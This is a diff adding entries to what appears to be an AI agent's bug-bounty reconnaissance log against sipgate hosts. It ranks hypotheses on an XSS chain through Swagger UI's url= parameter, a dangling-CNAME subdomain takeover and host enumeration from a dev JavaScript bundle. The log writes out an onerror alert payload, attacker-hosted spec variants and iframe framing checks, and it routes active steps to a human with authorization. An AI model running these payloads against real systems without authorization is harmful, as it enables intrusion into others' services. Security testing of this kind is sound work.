@@ -3105,3 +3105,33 @@ impact: defense-in-depth; chain material only for same-origin-XSS or token scena
 testability: PASSIVE (confirmed)
 [NEXT] HUMAN: In Chromium open `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<your-spec>` where the spec (OpenAPI3) has `info.x-logo.url=https://<attacker>/img.png` and `info.description` containing `<img src=x onerror=alert(document.domain)>` + a `<iframe src="https://attacker/">`; report (a) whether attacker markup renders into the api-origin DOM, (b) whether script executes on api origin, (c) whether `/v2/doc/` embeds in an attacker iframe (frameable re-check). Do both the `data:` and `https://<attacker>/spec.json` variants. This closes the only remaining high-value chain on the api surface (spec-forward + frameable + implicit extreme-scope OAuth client).
 [RISK] sipgate: 45 — No new critical unauthenticated vector. The top-ranked list-bypass hypothesis collapsed (401). The oauth2 clients subtree anomaly is real but empty-body (auth-consistency, not exposure). Reportable set unchanged: `/v2/*` CORS-credential reflection (now incl. oauth2 client list), doc/?url= frameable spec-forward chain (server facts complete; HUMAN-gated for execution proof), plus accepted family MISCONFIGs. Real data planes remain edge-401-uniform or AUTH_HELPED; no ATO/SSRF/money-bug surfaced unauthenticated.
+## 2026-09-12 21:43:18 UTC [target] (model bigpickle)
+[HYP] Attacker-spec frames on api origin with unconditional extreme-scope implicit OAuth client registration
+class: XSS
+asset: api.sipgate.com/v2/doc/?url=
+confidence: 48
+reasoning: Fresh this cycle: (1) `swagger-initializer.js` feeds decodeURIComponent of the single `url=` param into SwaggerUIBundle with no scheme/host allowlist; (2) server serves 200 text/html shell for `data:` AND attacker-https specs, no frame-ancestors/XFO, `SERVERID=web-apps-web02`; (3) `initOAuth` registers `sipgate-swagger-ui` (realm third-party, scopes incl oauth2-clients:write/balance:read/payment:methods:*) on EVERY doc load; (4) family CORS-cred reflection. oauth2RedirectUrl fixed same-origin so token redirect is not attacker-controllable.
+evidence_needed: attacker spec markup (info.description / info.x-logo.url) rendering in api-origin DOM; any script exec on api origin
+verify_steps: HUMAN: fresh Chromium, open `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<spec>` with `info.description=><img src=x onerror=alert(document.domain)>` and `info.x-logo.url=https://<attacker>/l.png`; repeat with `https://<attacker>/spec.json`; check iframe-embed of `/v2/doc/` from attacker page
+impact: CRITICAL if script executes (full api-scope token/session via implicit client + CORS-cred); else MEDIUM phishing amplifier on api origin
+testability: HUMAN_ONLY
+[HYP] Dev SPA bundle churn is a fresh topology signal for undisclosed prod/dev hosts
+class: MISCONFIG
+asset: app.dev.sipgate.com/assets/main-K-JtiyRc.js
+confidence: 45
+reasoning: Bundle unchanged this cycle (main-K-JtiyRc.js); 17 internal host:port pairs incl admin.live.sipgate.net/admin.dev.sipgate.net (→helpdesk aliases); non-standard ports (8443/3396) TCP-dead now, so SSRF/lateral turn deflated to churn-monitoring: each rotation historically added NEW hosts (5 rotations in 4 days).
+evidence_needed: next rotation with a host:port that resolves to a live service (200/403/401, any city) on non-standard port
+verify_steps: GET https://app.dev.sipgate.com/ → parse current main-*.js → grep `https?://[a-z0-9.-]+(:\d+)?` → DNS + ≤1rps probes on new hosts/ports
+impact: recon multiplier (internal naming, med/trusted subdomains); inform only until a host is live
+testability: PASSIVE
+[HYP] Dangling CNAME on sipgate.cloud enables subdomain takeover
+class: MISCONFIG
+asset: share1.sipgate.cloud
+confidence: 75
+reasoning: Repeated KB re-confirm: CNAME → `nx38603.your-storageshare.de` (Hetzner StorageShare) → NXDOMAIN; sipgate.cloud is the family cloud TLD (integration/grafana/influxdb family all sipgate-owned); no A record fallback.
+evidence_needed: control of the StorageShare name serving content on share1.sipgate.cloud (HUMAN registration + program consent)
+verify_steps: HUMAN: re-check `dig share1.sipgate.cloud CNAME` + NXDOMAIN proof-of-control; obtain authorization before registering/claiming
+impact: full host takeover on *.sipgate.cloud family — phishing/credential/email-cookie surface; MEDIUM-HIGH if claimed
+testability: HUMAN_ONLY
+[NEXT] HUMAN: Fresh Chromium (no cookies), open `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<spec>` where spec = OpenAPI3 with `info.description` = `<img src=x onerror=alert(document.domain)>` and `info.x-logo.url` = `https://<attacker>/log.png`; then repeat with `https://<attacker>/spec.json`. Report (a) attacker markup inserted into api-origin DOM, (b) alert(document.domain) fires, (c) `/v2/doc/` embeds in attacker `<iframe>`. Verdict decides CRITICAL-vs-phishing for the doc chain.
+[RISK] sipgate: 40 — No new critical unauthenticated vector. The last high-confidence api lead (oauth2 client list) collapsed to 404; ranked-#1 dev-topology SSRF deflated by port probes (inert). doc/?url= stands as frameable spec-shell + auto-registered extreme-scope implicit client, but script-exec remains HUMAN-unproven (chain-dependent). Reportable set unchanged: /v2/* CORS-cred reflection, doc/?url= frameable spec-shell (MEDIUM), family MISCONFIGs, share1 takeover candidate (HUMAN claim). Data planes uniformly edge-401; no ATO/SSRF/money bug surfaced unauthenticated.
